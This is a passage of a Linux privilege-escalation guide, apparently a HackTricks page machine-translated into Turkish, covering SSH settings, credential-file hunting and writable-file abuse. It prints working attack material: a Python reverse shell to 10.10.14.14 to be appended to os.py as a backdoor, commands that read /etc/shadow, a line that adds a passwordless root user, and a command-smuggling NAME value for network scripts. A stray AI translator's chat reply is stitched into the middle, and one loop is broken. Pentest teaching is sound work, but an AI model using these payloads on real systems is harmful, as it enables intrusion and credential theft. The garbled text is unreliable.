tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar, çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda ilgili private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şurada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola doğrulamasına izin verilip verilmeyeceğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key doğrulamasına izin verilip verilmeyeceğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola doğrulaması izinliyse, sunucunun şifre alanı boş olan hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

Root kullanıcısının ssh ile giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root password ve private key kullanarak giriş yapabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: root yalnızca private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : izin yok

### AuthorizedKeysFile

AuthorizedKeysFile, kullanıcı doğrulaması için kullanılabilecek public keyleri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bu tokenlar kullanıcının ev dizini ile değiştirilir. **Mutlak yolları belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının evinden göreli yollar**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer "**testusername**" kullanıcısının **private** anahtarı ile giriş yapmaya çalışırsanız, ssh anahtarınızın **public** kısmını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindeki anahtarlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (parola koruması olmayan!) anahtarları bırakmak yerine **yerel SSH anahtarlarınızı kullanmanıza** olanak tanır. Böylece ssh ile **bir hosta** **atlayabilir** ve oradan **başka bir hosta** **başlangıç hostunuzda** bulunan **anahtarı kullanarak** geçiş yapabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise kullanıcı her farklı makineye geçtiğinde, o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
Dosya `/etc/sshd_config`, `AllowAgentForwarding` anahtar kelimesiyle ssh-agent forwarding'e **izin verebilir** veya **reddedebilir** (varsayılan izinlidir).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir tuhaf profile script bulunursa, **hassas bilgiler** için kontrol etmelisiniz.

### Passwd/Shadow Files

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor olabilir veya bir yedeği bulunabilir. Bu yüzden **hepsini bulmanız** ve **okuyup okuyamadığınızı kontrol etmeniz**, dosyaların içinde **hashes olup olmadığını** görmek için önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasında **password hashes** bulunabilir
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
README.md dosyasının içeriğini gönderir misiniz? Çeviri yapmamı istediğiniz metni almam gerekiyor.

Ayrıca şu iki noktayı netleştirin:
- "Then add the user `hacker` and add the generated password." cümlesini çeviri metnine eklememi mi istiyorsunuz yoksa sistemde gerçekten bir kullanıcı oluşturup parola atamamı mı (gerçek sistem değişikliği yapamam)?
- Eklemek istiyorsanız, istediğiniz format nedir (ör. komut satırı örneği, düz metin açıklama)?

İçeriği gönderin; isteklerinize göre Türkçeye çevirip aynı markdown/html yapısını koruyacağım.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini düşürebilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı **hassas dosyalara yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** server çalıştırıyor ve **modify the Tomcat service configuration file inside /etc/systemd/,** yapabiliyorsanız, şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor bir sonraki tomcat başlatıldığında çalıştırılacak.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Sahip Olunan Dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilmiş dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parola içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; parola içerebilecek **birkaç olası dosyayı** arar.\
**Başka ilginç bir araç** olarak kullanabileceğiniz şey: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bir bilgisayarda saklanan birçok parolayı almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar tuhafsa, muhtemelen o kadar ilginç olur (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** size **parolaları** audit loglarına kaydetme imkânı verebilir; bu durum şu gönderide açıklandığı gibidir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Logları okuyabilmek için [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten yardımcı olacaktır.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dosya adında veya içeriğinde "**password**" kelimesini içeren dosyaları da kontrol etmelisin; ayrıca loglar içinde IP'leri ve e-postaları veya hash'lere karşı regex'leri de kontrol et.\
Burada bunların nasıl yapılacağını listelemeyeceğim ama ilgileniyorsan [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsin.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python script'inin **nereden** çalıştırılacağını biliyorsan ve o klasöre **yazabiliyorsan** veya python kütüphanelerini **değiştirebiliyorsan**, OS kütüphanesini değiştirip backdoor ekleyebilirsin (python script'inin çalıştırılacağı yere yazabiliyorsan, os.py kütüphanesini kopyala ve yapıştır).

Kütüphaneye **backdoor eklemek** için os.py kütüphanesinin sonuna aşağıdaki satırı ekle (IP ve PORT'u değiştir):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

Bir `logrotate` açığı, bir log dosyasında veya üst dizinlerinde **yazma izinlerine** sahip kullanıcıların potansiyel olarak ayrıcalık yükseltmesine olanak verir. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'in rastgele dosyaları çalıştıracak şekilde manipüle edilebilmesidir; özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde. İzinleri yalnızca _/var/log_ içinde değil, log döndürme uygulanan herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürümü `3.18.0` ve daha eski sürümleri etkiler

Açık hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu açığı [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzerdir; bu yüzden günlükleri değiştirebildiğinizi tespit ettiğinizde, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri sembolik linklerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ içine bir `ifcf-<whatever>` scripti **yazabiliyor** veya mevcut bir scripti **düzenleyebiliyorsa**, sisteminiz **pwned** olur.

Network scripts, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tamamen .INI dosyaları gibi görünürler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scriptlerinde `NAME=` olarak tanımlanan değer doğru şekilde işlenmiyor. İsimde **boşluk varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı** anlamına gelir.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id arasındaki boşluğu unutmayın_)

### **init, init.d, systemd ve rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **scripts** barındırır; bu, klasik Linux servis yönetim sistemidir. Burada servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için scriptler bulunur. Bu scriptler doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'dir.

Öte yandan, `/etc/init` Upstart ile ilişkilidir; Upstart, Ubuntu tarafından sunulan daha yeni bir servis yönetimidir ve servis yönetimi görevleri için konfigürasyon dosyaları kullanır. Upstart'a geçişe rağmen, Upstart içindeki bir uyumluluk katmanı nedeniyle SysVinit scriptleri hâlâ Upstart konfigürasyonlarıyla birlikte kullanılır.

systemd, isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumunun anlık görüntülerini alma gibi gelişmiş özellikler sunan modern bir init ve servis yöneticisi olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenleyerek sistem yöneticiliğini kolaylaştırır.

## Diğer İpuçları

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle privilegeli çekirdek fonksiyonlarını userspace bir manager'a açmak için bir syscall'a hook kurar. Zayıf manager kimlik doğrulaması (ör. FD-order'a dayalı imza kontrolleri veya zayıf parola şemaları) yerel bir app'in manager kılığına girip zaten root edilmiş cihazlarda root'a yükselmesine izin verebilir. Daha fazla bilgi ve istismar detayları için:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-tabanlı service discovery, VMware Tools/Aria Operations içinde işlem komut satırlarından bir binary path çıkarıp bunu ayrıcalıklı bir bağlamda `-v` ile çalıştırabilir. İzin verici desenler (ör. `\S` kullanımı) yazılabilir lokasyonlardaki (ör. `/tmp/httpd`) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve bunun sonucunda root olarak çalıştırmaya yol açabilir (CWE-426 Untrusted Search Path).

Daha fazlasını ve diğer discovery/monitoring yığınlarına uygulanabilir genelleştirilmiş deseni burada inceleyin:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'te çekirdek zafiyetlerini listeleme [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
